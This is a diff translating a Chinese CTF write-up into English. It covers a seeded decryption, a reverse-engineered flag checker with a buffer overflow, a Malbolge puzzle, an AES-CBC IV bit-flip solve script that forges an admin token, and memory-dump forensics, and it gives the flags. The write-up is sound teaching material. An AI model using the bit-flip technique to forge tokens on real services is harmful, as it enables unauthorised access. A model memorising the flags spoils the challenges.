-由於程式啟動後才 sleep，也就是 time(NULL) 時間早已固定，所以可以直接在 sleep 之前暫停下來、取得時間種子（或直接 patch sleep 後進行分析）。
+* Strategy:
+Since sleep happens after startup, `time(NULL)` is already fixed. Pause before sleep to get seed (or patch sleep and analyze directly).
 
-將解密邏輯轉為 Python 腳本，代入加密字串與固定參數，即可還原 flag。
+Convert decryption logic into Python and plug in ciphertext plus fixed params to recover flag.
 ```
 # Construct cipher list using list of offsets and values manually transcribed above:
 
-# 共 67 個 bytes
+# Total 67 bytes
 offset_values = {
     0x2060:0x00,0x2064:0x01,0x2068:0x02,0x206C:0x03,0x2070:0x04,
     0x2074:0x37,0x2078:0x1D,0x207C:0x64,0x2080:0x30,0x2084:0x11,
@@ -1046,22 +1046,22 @@ print(flag)
 
 ## Flag Checker
 
-在 IDA 打開題目提供的 chal 檔案，查看 main function 重點:
-* 輸入 flag 並存入 s：
+Open provided `chal` in IDA and inspect key points in `main`:
+* Input flag into `s`:
 ```
 printf("flag >");
 __isoc99_scanf("%255s", s);
 ```
-用戶輸入會存入 s，最多 255 個字元（但 s 大小只有 8 bytes）。
-* 對每個字元進行處理：
+User input goes into `s`, up to 255 chars (but `s` is only 8 bytes).
+* Process each character:
 ```
 for ( i = 0; i < strlen(s); ++i )
     s[i] = ((s[i] << (i & 7)) | (s[i] >> (-(char)i & 7))) ^ 0xF;
 ```
-這是個類似 rotate left/right + XOR 的加密方式。
-`(i & 7)` 其實就是 ` i % 8`。
-`(-(char)i & 7)` 是一種技巧，等價於 `(8 - (i % 8)) % 8`。
-* 接著丟進一個叫 sub_11C9 的函數做驗證。
+This is a rotate-left/right + XOR style transform.
+`(i & 7)` is just `i % 8`.
+`(-(char)i & 7)` is a trick equivalent to `(8 - (i % 8)) % 8`.
+* Then pass to function `sub_11C9` for validation.
 
 sub_11c9:
 ```
@@ -1081,7 +1081,7 @@ __int64 __fastcall sub_11C9(__int64 a1)
   return 1;
 }
 ```
-sub_11C9 做了類似 checksum 檢查。每**三個字元**一組，形成**三個加法條件**，總共會檢查 33 個 bytes。也就是說 s（或它 overflow 寫到的區域）至少需要提供 33 個有效 byte。接著再從 sub_11C9 中提到的 dword_4020 找出 33 個 bytes 進行解密。
+`sub_11C9` performs checksum-like checks: every **3 chars** form **3 sum constraints**, totaling 33 checked bytes. So `s` (or overflowed region) must provide at least 33 valid bytes. Then use `dword_4020` to reconstruct/decrypt those 33 bytes.
 
 ```
 dword_4020 = [
@@ -1091,7 +1091,7 @@ dword_4020 = [
     0x174, 0x1DD, 0x50, 0x0, 0x50
 ]
 
-# 還原加密後的 s
+# Reconstruct encrypted `s`
 s_enc = []
 
 for i in range(0, 33, 3):
@@ -1105,7 +1105,7 @@ for i in range(0, 33, 3):
 
     s_enc.extend([x, y, z])
 
-# 還原原始輸入（被加密前的）
+# Recover original input (before encryption)
 def decrypt_byte(b, i):
     b ^= 0xF
     b = ((b >> (i & 7)) | (b << (8 - (i & 7)))) & 0xFF
@@ -1127,12 +1127,12 @@ Hint1: Some things will not succeed if you just observe them. You need to execut
 
 Hint2: Having said that, his level of chaos is beyond imagination. Although it is not as exaggerated as the 18th level of hell, it can be regarded as the 8th level of hell.
 
-根據提示猜測這是一段程式碼，需要被執行，而Malbolge 是最可能的語言。它正是以「難讀」與「地獄級難度」著稱，符合「8th level of hell」這種形容。於是至 [Malbolge online](https://www.tutorialspoint.com/compilers/online-malbolge-compiler.htm) 執行後跑出`VEhKQ0N7QHIhc3UhMXl9`，再用 base64 解碼出 Flag。
+From hints, this is likely executable code, and Malbolge best fits due to its notorious difficulty (“8th level of hell”). Running it on [Malbolge online](https://www.tutorialspoint.com/compilers/online-malbolge-compiler.htm) outputs `VEhKQ0N7QHIhc3UhMXl9`, which base64-decodes to the flag.
 **Flag: THJCC{@r!su!1y}**
 
 ## Yoshino's Secret
 
-這個題目提供了一個使用 AES-CBC 加密模式的身份驗證系統。
+This challenge provides an authentication system using AES-CBC.
 chal.py:
 ```
 from Crypto.Cipher import AES
@@ -1141,15 +1141,15 @@ from secret import FLAG
 import json
 import os
 
-KEY = os.urandom(16)  # 隨機生成16位元的AES密鑰
+KEY = os.urandom(16)  # randomly generated 16-byte AES key
 
 def encrypt(plaintext: bytes) -> bytes:
-    iv = plaintext[:16]  # 使用明文的前16個字節作為IV
+    iv = plaintext[:16]  # use first 16 plaintext bytes as IV
     cipher = AES.new(KEY, AES.MODE_CBC, iv)
     return iv + cipher.encrypt(pad(plaintext[16:], AES.block_size))
 
 def decrypt(ciphertext: bytes) -> str:
-    iv = ciphertext[:16]  # 將密文的前16個字節作為IV
+    iv = ciphertext[:16]  # use first 16 ciphertext bytes as IV
     cipher = AES.new(KEY, AES.MODE_CBC, iv)
     plaintext = unpad(cipher.decrypt(ciphertext[16:]), AES.block_size)
     return plaintext
@@ -1159,7 +1159,7 @@ def check(token):
         token = bytes.fromhex(token)
         passkey = decrypt(token)
         data = json.loads(passkey)
-        if data["admin"]:  # 如果admin為true，則輸出FLAG
+        if data["admin"]:  # if admin is true, output FLAG
             print(f"Here is your flag: {FLAG}")
             exit()
         else:
@@ -1169,70 +1169,70 @@ def check(token):
         exit()
 
 def main():
-    passkey = b'{"admin":false,"id":"TomotakeYoshino"}'  # 預設admin為false
-    token = encrypt(os.urandom(16) + passkey)  # 生成token
+    passkey = b'{"admin":false,"id":"TomotakeYoshino"}'  # default admin is false
+    token = encrypt(os.urandom(16) + passkey)  # generate token
     print(f"token: {token.hex()}")
     while True:
         token = input("token > ")
         check(token)
 ```
-* 攻擊策略:
-目標是將 "admin":false 改為 "admin":true （注意後面有空格，保持字串長度不變）。我們可以利用 **CBC 模式**的特性，通過修改IV (即token的前16個字節) 來影響解密後的結果。具體來說如果我們修改 IV 中的第 i 個字節，它會直接影響解密後明文的第i個字節這種影響是通過 XOR 操作進行的，所以我們可以精確控制明文的變化。
-* 實際攻擊步驟
-獲取原始token
-將其從十六進制轉換為字節
-分離IV (前16個字節) 和密文 (其餘部分)
-確定 "false" 在明文中的位置
-通過XOR操作修改IV中對應位置的字節，使得解密後 "false" 變為 "true "
+* Attack strategy:
+Goal is to flip `"admin":false` to `"admin":true ` (note trailing space to preserve length). Using CBC properties, modify IV (first 16 token bytes) to control decrypted plaintext bytes via XOR.
+* Practical attack steps
+Get original token
+Convert from hex to bytes
+Split IV (first 16 bytes) and ciphertext (rest)
+Locate `false` in plaintext
+Modify corresponding IV bytes via XOR so decrypted `false` becomes `true `
 
-解題腳本:
+Solve script:
 ```
-# 首先运行原程序获取一个token
-# 假设获取到的token是hexstring
+# First run original program to get a token
+# Assume received token is hex string
 
-# 然后进行以下操作
+# Then do the following
 import binascii
 
 def solve(original_token_hex):
-    # 1. 将token从hex转换为bytes
+    # 1. Convert token hex to bytes
     token = bytes.fromhex(original_token_hex)
     
-    # 2. 分离IV和密文
+    # 2. Split IV and ciphertext
     iv = bytearray(token[:16])
     ciphertext = token[16:]
     
-    # 3. 我们知道解密后的明文是 {"admin":false,"id":"TomotakeYoshino"}
-    # 需要修改的是 "false" 变成 "true "
-    # 确定 "false" 在第一个块中的位置
-    # 假设 "admin":false 在明文的前16个字节内
-    # 从明文位置 {"admin":f 开始算起，false的位置大概在第10个字节开始
+    # 3. Decrypted plaintext is {"admin":false,"id":"TomotakeYoshino"}
+    # Need to change "false" to "true "
+    # Determine position of "false" in first block
+    # Assume "admin":false is within first 16 plaintext bytes
+    # Starting from {"admin":f, false starts around byte 10
     
-    # 我们要修改的位置
+    # Positions to modify
     positions = {
-        9: ord('f') ^ ord('t'),  # 修改 f -> t
-        10: ord('a') ^ ord('r'),  # 修改 a -> r
-        11: ord('l') ^ ord('u'),  # 修改 l -> u
-        12: ord('s') ^ ord('e'),  # 修改 s -> e
-        13: ord('e') ^ ord(' ')   # 修改 e -> 空格
+        9: ord('f') ^ ord('t'),  # change f -> t
+        10: ord('a') ^ ord('r'),  # change a -> r
+        11: ord('l') ^ ord('u'),  # change l -> u
+        12: ord('s') ^ ord('e'),  # change s -> e
+        13: ord('e') ^ ord(' ')   # change e -> space
     }
     
-    # 4. 在IV中进行位翻转
+    # 4. Bit-flip in IV
     for pos, xor_val in positions.items():
         iv[pos] ^= xor_val
     
-    # 5. 组合修改后的IV和原始密文
+    # 5. Combine modified IV with original ciphertext
     modified_token = bytes(iv) + ciphertext
     
-    # 6. 转换回hex格式
+    # 6. Convert back to hex
     return modified_token.hex()
 
-# 使用程序获得的token
-# 运行程序，复制程序输出的token
-original_token = input("请输入原始token: ")
+# Token obtained from program
+# Run program and copy output token
+original_token = input("Enter original token: ")
 
-# 生成修改后的token
+# Generate modified token
 modified_token = solve(original_token)
-print("修改后的token:")
+print("Modified token:")
 print(modified_token)
 ```
 **Flag: THJCC{F1iP_Ou7_y0$Hino's_53Cr3t}**
@@ -1240,6 +1240,6 @@ print(modified_token)
 ## Hidden in memory...
 Hint: Find the computer name and submit with THJCC{computername}
 
-下載題目的 memdump.rar 後解壓縮得到 memdump.dmp，根據題目指示輸入`!PEB`得到 `COMPUTERNAME=WH3R3-Y0U-G3TM3`
+After downloading `memdump.rar` and extracting `memdump.dmp`, run `!PEB` as instructed to get `COMPUTERNAME=WH3R3-Y0U-G3TM3`
 
 **Flag: THJCC{WH3R3-Y0U-G3TM3}**
